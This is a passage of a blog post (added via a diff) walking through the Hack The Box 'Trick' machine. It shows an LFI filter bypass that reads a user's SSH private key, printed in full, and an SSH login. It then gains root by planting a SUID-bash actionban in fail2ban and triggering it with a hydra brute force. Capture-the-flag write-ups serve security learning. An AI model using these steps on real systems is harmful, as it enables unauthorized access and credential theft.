+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>if(!isset($file) || ($file==&#34;index.php&#34;)) {
+</span></span><span style="display:flex;"><span>   include(&#34;/var/www/market/home.html&#34;);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>else{
+</span></span><span style="display:flex;"><span>        include(&#34;/var/www/market/&#34;.str_replace(&#34;../&#34;,&#34;&#34;,$file));
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>?&gt;
+</span></span></code></pre></div><p>This means that we should be able to use any number of obfuscations to bypass this. We use a simple one, <code>....//</code> and are able to exploit LFI
+<img src="images/Trick/lfi.png" alt="Marketing"></p>
+<p>Let&rsquo;s try to read michael&rsquo;s SSH private key to see if we can finally get initial access</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /index.php?page=....//....//....//home/michael/.ssh/id_rsa <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">preprod-marketing.trick.htb</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Priority<span style="color:#f92672">:</span> <span style="color:#ae81ff">u=0, i</span>
+</span></span></code></pre></div><p>In the response we see that we can read the private key!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">nginx/1.14.2</span>
+</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Fri, 21 Feb 2025 03:06:59 GMT</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html; charset=UTF-8</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">1823</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----BEGIN OPENSSH PRIVATE KEY-----
+</span></span><span style="display:flex;"><span>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+</span></span><span style="display:flex;"><span>NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
+</span></span><span style="display:flex;"><span>c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
+</span></span><span style="display:flex;"><span>YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
+</span></span><span style="display:flex;"><span>4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
+</span></span><span style="display:flex;"><span>Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
+</span></span><span style="display:flex;"><span>1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
+</span></span><span style="display:flex;"><span>DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+</span></span><span style="display:flex;"><span>+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
+</span></span><span style="display:flex;"><span>hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
+</span></span><span style="display:flex;"><span>jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
+</span></span><span style="display:flex;"><span>IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
+</span></span><span style="display:flex;"><span>aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
+</span></span><span style="display:flex;"><span>KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
+</span></span><span style="display:flex;"><span>tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
+</span></span><span style="display:flex;"><span>U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
+</span></span><span style="display:flex;"><span>fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
+</span></span><span style="display:flex;"><span>PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
+</span></span><span style="display:flex;"><span>3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
+</span></span><span style="display:flex;"><span>fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
+</span></span><span style="display:flex;"><span>AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
+</span></span><span style="display:flex;"><span>In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
+</span></span><span style="display:flex;"><span>JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
+</span></span><span style="display:flex;"><span>jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
+</span></span><span style="display:flex;"><span>IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
+</span></span><span style="display:flex;"><span>-----END OPENSSH PRIVATE KEY-----
+</span></span></code></pre></div><p>We copy that over to a file on our attack host, making sure we add an empty line to the end, and do a <code>chmod 600</code> on it. Finally, we are able to SSH in</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ssh -i id_rsa michael@10.10.11.166
+</span></span><span style="display:flex;"><span>Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>The programs included with the Debian GNU/Linux system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms for each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span style="display:flex;"><span>permitted by applicable law.
+</span></span><span style="display:flex;"><span>michael@trick:~$
+</span></span></code></pre></div><p>We can grab the user flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>michael@trick:~$ cat user.txt
+</span></span><span style="display:flex;"><span>128c06b21239dfd20627dc57d3b3de00
+</span></span></code></pre></div><p>Right off the bat, it looks like michael is in the <code>security</code> group</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ id
+</span></span><span style="display:flex;"><span>uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
+</span></span></code></pre></div><p>This is not a built-in group, that I know of, so let&rsquo;s see if we can access any special files with this group</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ find / -group security 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/etc/fail2ban/action.d
+</span></span></code></pre></div><p><code>fail2ban</code> is a intrusion prevention software that scans log files and bans IP addresses that perform too many failed login attempts. Maybe we also have some <code>sudo</code> privileges related to this?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries for michael on trick:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>User michael may run the following commands on trick:
+</span></span><span style="display:flex;"><span>    (root) NOPASSWD: /etc/init.d/fail2ban restart 
+</span></span></code></pre></div><p>Looks like michael can restart <code>fail2ban</code>. A quick google search for <code>fail2ban priviilege escalation</code> brings us to <a href="https://juggernaut-sec.com/fail2ban-lpe/">this article</a>. Basically, there is a file called <code>jail.conf</code> which specifies services and an action to take in the case of three failed login attempts. The actions are located in <code>action.d</code>, which is the directory that we have write access to thanks to our group</p>
+<p>First we check <code>jail.conf</code> to check the settings</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span># <span style="color:#e6db74">&#34;bantime&#34;</span> is the number of seconds that a host is banned.
+</span></span><span style="display:flex;"><span>bantime  = 10s
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># A host is banned <span style="color:#66d9ef">if</span> it has generated <span style="color:#e6db74">&#34;maxretry&#34;</span> during the last <span style="color:#e6db74">&#34;findtime&#34;</span>
+</span></span><span style="display:flex;"><span># seconds.
+</span></span><span style="display:flex;"><span>findtime  = 10s
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># <span style="color:#e6db74">&#34;maxretry&#34;</span> is the number of failures before a host get banned.
+</span></span><span style="display:flex;"><span>maxretry = 5
+</span></span></code></pre></div><p>Scrolling up a bit we see that information about enabled services and how a <code>jail.local</code> file should be created instead of modifying the <code>jail.conf</code> file</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span># YOU SHOULD NOT MODIFY THIS FILE.
+</span></span><span style="display:flex;"><span>#
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># It will probably be overwritten or improved in a distribution update.</span>
+</span></span><span style="display:flex;"><span>#
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Provide customizations in a jail.local file or a jail.d/customisation.local.</span>
+</span></span><span style="display:flex;"><span># For example to change the default bantime <span style="color:#66d9ef">for</span> all jails and to enable the
+</span></span><span style="display:flex;"><span># ssh-iptables jail the following <span style="color:#f92672">(</span>uncommented<span style="color:#f92672">)</span> would appear in the .local file.
+</span></span><span style="display:flex;"><span># See man <span style="color:#ae81ff">5</span> jail.conf <span style="color:#66d9ef">for</span> details.
+</span></span><span style="display:flex;"><span>#
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># [DEFAULT]</span>
+</span></span><span style="display:flex;"><span># bantime <span style="color:#f92672">=</span> 1h
+</span></span><span style="display:flex;"><span>#
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># [sshd]</span>
+</span></span><span style="display:flex;"><span># enabled <span style="color:#f92672">=</span> true
+</span></span><span style="display:flex;"><span>#
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># See jail.conf(5) man page for more information</span>
+</span></span></code></pre></div><p>In the <code>jail.d</code> directory, we can see a config file which shows enabled for <code>sshd</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>michael@trick:/etc/fail2ban/jail.d$ cat defaults-debian.conf 
+</span></span><span style="display:flex;"><span>[sshd]
+</span></span><span style="display:flex;"><span>enabled = true
+</span></span></code></pre></div><p>Based on our group membership, we have privileges on the <code>action.d</code> directory</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>michael@trick:/etc/fail2ban$ ls -l
+</span></span><span style="display:flex;"><span>total 60
+</span></span><span style="display:flex;"><span>drwxrwx--- 2 root security  4096 Feb 21 17:18 action.d
+</span></span><span style="display:flex;"><span>-rw-r--r-- 1 root root      2334 Feb 21 17:18 fail2ban.conf
+</span></span><span style="display:flex;"><span>drwxr-xr-x 2 root root      4096 Feb 21 17:18 fail2ban.d
+</span></span><span style="display:flex;"><span>drwxr-xr-x 3 root root      4096 Feb 21 17:18 filter.d
+</span></span><span style="display:flex;"><span>-rw-r--r-- 1 root root     22908 Feb 21 17:18 jail.conf
+</span></span><span style="display:flex;"><span>drwxr-xr-x 2 root root      4096 Feb 21 17:18 jail.d
+</span></span><span style="display:flex;"><span>-rw-r--r-- 1 root root       645 Feb 21 17:18 paths-arch.conf
+</span></span><span style="display:flex;"><span>-rw-r--r-- 1 root root      2827 Feb 21 17:18 paths-common.conf
+</span></span><span style="display:flex;"><span>-rw-r--r-- 1 root root       573 Feb 21 17:18 paths-debian.conf
+</span></span><span style="display:flex;"><span>-rw-r--r-- 1 root root       738 Feb 21 17:18 paths-opensuse.conf
+</span></span></code></pre></div><p>However, inside the directory, we don&rsquo;t have write permissions on any of the files including the one we are interested in <code>iptables-multiport.conf</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>-rw-r--r-- 1 root root      1420 Feb 21 17:18 iptables-multiport.conf
+</span></span></code></pre></div><p>In order to get around this, we are going to copy the file to our home directory, edit the file, rename the old files, and then place it back into the <code>action.d</code> directory</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>michael@trick:/etc/fail2ban$ cp action.d/iptables-multiport.conf ~/
+</span></span></code></pre></div><p><em>Note: you can also just rename the <code>iptables-multiport.conf</code> inside the <code>action.d</code> directory, and create a new file with the edited contents</em></p>
+<p>Then edit the file to add a line that will copy /bin/bash into <code>/tmp</code> and give it SUID permissions. Make sure to comment the other ban action out!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>&lt;SNIP&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span># Option:  actionban
+</span></span><span style="display:flex;"><span># Notes.:  command executed when banning an IP. Take care that the
+</span></span><span style="display:flex;"><span>#          command is executed with Fail2Ban user rights.
+</span></span><span style="display:flex;"><span># Tags:    See jail.conf<span style="color:#f92672">(</span>5<span style="color:#f92672">)</span> man page
+</span></span><span style="display:flex;"><span># Values:  CMD
+</span></span><span style="display:flex;"><span>#
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#actionban = &lt;iptables&gt; -I f2b-&lt;name&gt; 1 -s &lt;ip&gt; -j &lt;blocktype&gt;</span>
+</span></span><span style="display:flex;"><span>actionban = cp /bin/bash /tmp &amp;&amp; chmod 4755 /tmp/bash
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
+</span></span></code></pre></div><p>Rename the original file and then copy our malicious one over</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>michael@trick:~$ mv /etc/fail2ban/action.d/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf.bak
+</span></span><span style="display:flex;"><span>michael@trick:~$ cp iptables-multiport.conf /etc/fail2ban/action.d/
+</span></span></code></pre></div><p>Now we restart the service</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>michael@trick:~$ sudo /etc/init.d/fail2ban restart
+</span></span></code></pre></div><p>Then we perform a brute-force attack against SSH in order to trigger <code>fail2ban</code> that will trigger the action we set</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.11.166
+</span></span></code></pre></div><p>After a bit, we should see the <code>bash</code> file pop up in <code>/tmp</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>michael@trick:/etc/fail2ban$ ls /tmp
+</span></span><span style="display:flex;"><span>bash                                                                          systemd-private-d14deb3214144d22baf2cd1704f0128a-rtkit-daemon.service-JQ2vpO       VMwareDnD
+</span></span><span style="display:flex;"><span>systemd-private-d14deb3214144d22baf2cd1704f0128a-colord.service-f7bWw6        systemd-private-d14deb3214144d22baf2cd1704f0128a-systemd-timesyncd.service-VtK8OA  vmware-root_353-1824328440
+</span></span><span style="display:flex;"><span>systemd-private-d14deb3214144d22baf2cd1704f0128a-ModemManager.service-wTJy1O  systemd-private-d14deb3214144d22baf2cd1704f0128a-upower.service-OseutS
+</span></span></code></pre></div><p>We are root!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>bash-5.0# whoami ; id
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>uid=1001(michael) gid=1001(michael) euid=0(root) groups=1001(michael),1002(security)
+</span></span></code></pre></div><p>We can finally grab the root flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>bash-5.0# cat /root/root.txt 
+</span></span><span style="display:flex;"><span>1d42925041eb7830e2cc5a09d07b0cbd
+</span></span></code></pre></div>
+</content>
+<p>
+  
+  <a href="https://jordangalida.github.io/blog/htb/">#HTB</a>
+  
+  <a href="https://jordangalida.github.io/blog/pentesting/">#Pentesting</a>
+  
+</p>
+
+  </main>
+  <footer>Made with <a href="https://github.com/janraasch/hugo-bearblog/">Hugo ʕ•ᴥ•ʔ Bear</a>
+</footer>
+
+    
+</body>
+
+</html>
